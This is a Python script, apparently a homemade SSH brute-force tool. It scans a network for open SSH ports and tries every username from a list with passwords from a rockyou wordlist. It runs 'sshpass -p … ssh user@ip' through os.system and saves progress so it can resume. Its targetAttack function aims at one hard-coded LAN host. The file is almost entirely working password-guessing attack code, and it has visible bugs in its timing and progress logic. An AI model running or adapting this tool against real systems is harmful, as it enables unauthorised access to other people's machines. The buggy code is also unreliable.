import os
import time

'''
-------------------------------------------------------MYIMPORTS-------------------------------------------------------
'''

import SSHScanNetwork
import SSHFiles

myGlobalIp = SSHScanNetwork.getMyGlobalIp()

splitBy = SSHFiles.detectOS()
getPathToCurrentDir = SSHFiles.getPathToCurrentDir()
amountOfLinesInRockyou = SSHFiles.getAmountOfLinesInFile(getPathToCurrentDir + "rockyou2.txt")
#print(linesInFile)

'''
-------------------------------------------------------TIMING-------------------------------------------------------
'''

days = 0
hours = 0
minutes = 0
runtimeSeconds = time.process_time()

'''
-------------------------------------------------------MODE-------------------------------------------------------
'''

mode2 = "ssh"
mode = "sshpass -p"
toAttack = "potet"
server = "192.168.1.131"

'''
-------------------------------------------------------FILES TO READ-------------------------------------------------------
'''

passwordFile = "rockyou2.txt"
usernameFile = "usernames.txt"
IPFolderName = "IPs"

#Reading passwords
passwords = usernames = SSHFiles.readTXTFile(getPathToCurrentDir + "rockyou2.txt")

#Reading usernames
usernames = SSHFiles.readTXTFile(getPathToCurrentDir + "usernames.txt")

ipAddresses = SSHScanNetwork.getListWithIpsOfOpenSSHPorts()

'''
-------------------------------------------------------TIME-------------------------------------------------------
'''

def formatTime(runtimeSeconds, minutes, hours, days):
    runtimeSeconds = time.process_time_ns() / 100000000
    if runtimeSeconds >= 60:
        runtimeSeconds = runtimeSeconds - 60
        minutes = minutes + 1
    if  minutes >= 60:
        minutes = minutes - 60
        hours = hours + 1
    if hours >= 24:
        hours = hours - 24
        days + days + 1
    return "D: " + str(days) + "H: " + str(hours) + "M: " + str(minutes) + "S: " + str(runtimeSeconds)

'''
-------------------------------------------------------PROGRAMS-------------------------------------------------------
'''

def attackAllOnScannedNetworkBySequence():
    counter = 0
    isError = False
    for ip in ipAddresses:
        if isError:
            break
        SSHFiles.createTXTFileInSpecifiedDir(ip, SSHFiles.getPathToCurrentDir() + IPFolderName + splitBy)
        for user in usernames:
            if isError:
                break
            index = resumeFromWhere(ip, user)
            if index == -1:
                #Goes to next user
                continue
            removingBreakline = user.split("\n")
            user = removingBreakline[0]
            for pw in passwords:
                try:
                    if isError:
                        break
                    counter += 1
                    if counter <= index:
                        #Skipping all previously tried passwords
                        continue
                    if amountOfLinesInRockyou == counter:
                        writeProgress(ip, user, "DONE")
                    checkIfCounterIs143(counter, ip, user)
                    #pw = pw[:-1]
                    password = str(pw)
                    passwordList = password.split("\n")
                    password = passwordList[0]
                    print("Attacking: " + ip + " with user: " + str(user) + " Trying: with password: " + password + " Attempt: " + str(counter))  
                    commandLiteral = mode + " " + password + " " + mode2 + " " + str(user) + "@" + ip
                    print(commandLiteral)
                    command = mode + " " + password + " " + mode2 + " " + str(user) + "@" + ip
                    os.system(command)
                except KeyboardInterrupt:
                    print("etasd")
                    isError = True
                    break

def attackAllOnScannedNetworkBySequenceImproved():
    counter = 0
    isError = False
    for ip in ipAddresses:
        if isError:
            break

def targetAttack(ipAddress, usernameOrpassword, howManyInstances):
    # EG VAR HER SIST
    #ipAddress, usernameOrpassword, howManyInstances
    #Used when you have additional information about target
    #usernameOrpassword is a list with '-u username' AND OR '-p password' 

    #username = -u 'username'
    #password = -p 'password'

    print("")

    nilsIP = "192.168.1.111"
    counter = 0
    isError = False
    for pw in passwords:
        try:
            if isError:
                break
            counter += 1
            pw = pw[:-1]
            password = str(pw)
            command = mode + " " + password + " " + mode2 + " potet" + "@" + nilsIP
            os.system(command)
        except KeyboardInterrupt:
            print("etasd")
            isError = True
            break

#def readPreviouslyAttacked(listWithIPs):

'''
-------------------------------------------------------HELPERS-------------------------------------------------------
'''

def checkIfCounterIs143(counter, ip, user):
    if (round(amountOfLinesInRockyou / 100000) % counter) == 0:
        #For every 143 lines it saves progress
        writeProgress(ip, user, 1)

def resumeFromWhere(ip, username):
    filename = SSHFiles.getPathToCurrentDir() + IPFolderName + splitBy + ip
    if SSHFiles.checkIfFileExist(filename):
        #Checks if current ip has a file named after itsself if it has returns true
        contentOfFile = SSHFiles.readTXTFile(filename)
        index = 0
        for i in range(SSHFiles.getAmountOfLinesInFile(filename)):
            splitList = contentOfFile[i].split(" ")
            if username == splitList[0] and splitList[1]  == "DONE":
                print("Done testing passwords for this user. Proceeding to next user...")
                index = -1
                break
            elif username == splitList[0]:
                index = index + (143 * pow(10, int(splitList[1]))) #splitList[1] might include "\n"
        #Returns the index where it should start to read for new passwords
        return index

def writeProgress(ip, username, value):
    #Default value is 1
    #See info.txt in IPs
    print("Adding progress to file...")
    SSHFiles.addTextToSpecifiedFile(ip + ".txt", SSHFiles.getPathToCurrentDir() + IPFolderName + splitBy, username + " " + value)

'''
-------------------------------------------------------MAIN-------------------------------------------------------
'''


#targetAttack()
#attackAllOnScannedNetworkBySequence()
#writeProgress("192.168.1.20", "test")
print(resumeFromWhere("192.168.1.20.txt", "isak"))